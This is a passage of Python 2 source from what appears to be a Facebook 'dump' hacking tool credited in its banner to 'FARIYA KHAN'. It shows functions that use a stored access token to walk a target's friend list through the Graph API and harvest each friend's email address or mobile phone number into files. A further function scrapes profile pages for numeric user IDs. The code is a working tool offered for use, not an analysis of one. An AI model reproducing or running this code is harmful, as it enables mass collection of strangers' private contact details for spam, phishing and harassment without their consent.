        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Email \x1b[1;91m: \x1b[1;97m%s' % len(emfromteman)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file with name\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/em_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()


def phonex():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('reset')
        print logo
        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
        idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Friend not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all friend number from friend \x1b[1;97m...')
        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
        bz = open('out/no_teman_from_teman.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            try:
                hpfromteman.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(hpfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            except KeyError:
                pass

        bz.close()
        print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSuccessfully get number \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Number \x1b[1;91m: \x1b[1;97m%s' % len(hpfromteman)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file with name\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/no_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Error creating file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
        keluar()


def numericx():
    try:
        os.system('clear')
        print "\n\x1b[1;93m _____ _           _   ___ ____    _____ ____\n\x1b[1;94m|  ___(_)_ __   __| | |_ _|  _ \\  |  ___| __ )\n\x1b[1;93m| |_  | | '_ \\ / _` |  | || | | | | |_  |  _ \x1b[1;94m|  _| | | | | | (_| |  | || |_| | |  _| | |_) |\n\x1b[1;93m|_|   |_|_| |_|\\__,_| |___|____/  |_|   |____/\n\n\x1b[0;31m \x1b[1;31m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* CREATOR : \x1b[1;39mFARIYA KHAN                      \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* FACEBOOK: \x1b[1;39mm.facebook.com/Faritricker007    \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x91\x1b[0;33m\x1b[1;33m* PAGE  : \x1b[1;39mTech Fari                          \x1b[1;31m\xe2\x95\x91\n\x1b[0;31m \x1b[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d"
        u = raw_input('Enter Username > ')
        url = 'https://www.facebook.com/' + u
        r = requests.get(url).text
        name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
        id = re.search('profile/(.*?)" ', r).group(1)
        print '\nNAME > ' + name
        print 'ID   > ' + id + '\n'
    except requests.exceptions.ConnectionError:
        print 'No Connection'
    except AttributeError:
        print 'Username Not Found'

    print '\x1b[1;97m \xe2\x9a\x94\xc2\xab--------------------------------------------\xc2\xbb\xe2\x9a\x94'


if __name__ == '__main__':
    login()